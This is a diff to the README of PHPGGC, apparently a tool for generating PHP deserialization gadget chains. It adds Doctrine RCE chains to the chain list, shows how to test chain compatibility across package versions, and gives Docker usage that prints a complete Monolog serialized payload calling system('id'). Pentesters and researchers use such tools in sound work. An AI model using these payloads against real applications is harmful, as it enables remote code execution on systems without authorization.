@@ -30,6 +30,8 @@ CodeIgniter4/RCE3                         -4.1.3+                               
 CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          
 Doctrine/FW1                              ?                                                    File write             __toString     *    
 Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    
+Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     * 
+Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     * 
 Dompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    
 Dompdf/FD2                                ? < 1.1.1                                            File delete            __destruct     *    
 Drupal7/FD1                               7.0 < ?                                              File delete            __destruct     *    
@@ -335,6 +337,20 @@ Testing 59 versions for monolog/monolog against 2 gadget chains.
 └─────────────────┴─────────┴──────────────┴──────────────┘
 ```
 
+You can specify the versions you want to test by using the following syntaxe.
+
+```
+$ ./test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1 monolog/rce3
+Testing 2 versions for monolog/monolog against 2 gadget chains.
+
+┏━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┓
+┃ monolog/monolog ┃ Package ┃ monolog/rce1 ┃ monolog/rce3 ┃
+┡━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━┩
+│ 2.3.0           │   OK    │      OK      │      KO      │
+│ 1.25.4          │   OK    │      OK      │      KO      │
+└─────────────────┴─────────┴──────────────┴──────────────┘
+```
+
 # API
 
 Instead of using PHPGGC as a command line tool, you can program PHP scripts:
@@ -397,8 +413,28 @@ For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetc
 
 # Docker
 
-If you don't want to install PHP, you can use `docker build`.
+If you don't want to install PHP, you can use `docker build . -t 'phpggc'`.
 
+To generate a gadget chain.
+
+```
+$ docker run phpggc Monolog/rce1 'system' 'id'
+O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}
+```
+
+To run `test-gc-compatibility.py` from docker.
+```
+$ docker run --entrypoint './test-gc-compatibility.py' phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2
+Runing on PHP version ('PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).
+Testing 2 versions for doctrine/doctrine-bundle against 2 gadget chains.
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
+┃ doctrine/doctrine-bundle ┃ Package ┃ doctrine/rce1 ┃ doctrine/rce2 ┃
+┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩
+│ 2.2                      │   OK    │      OK       │      OK       │
+│ 2.7.2                    │   OK    │      OK       │      KO       │
+└──────────────────────────┴─────────┴───────────────┴───────────────┘
+```
 
 # License
 
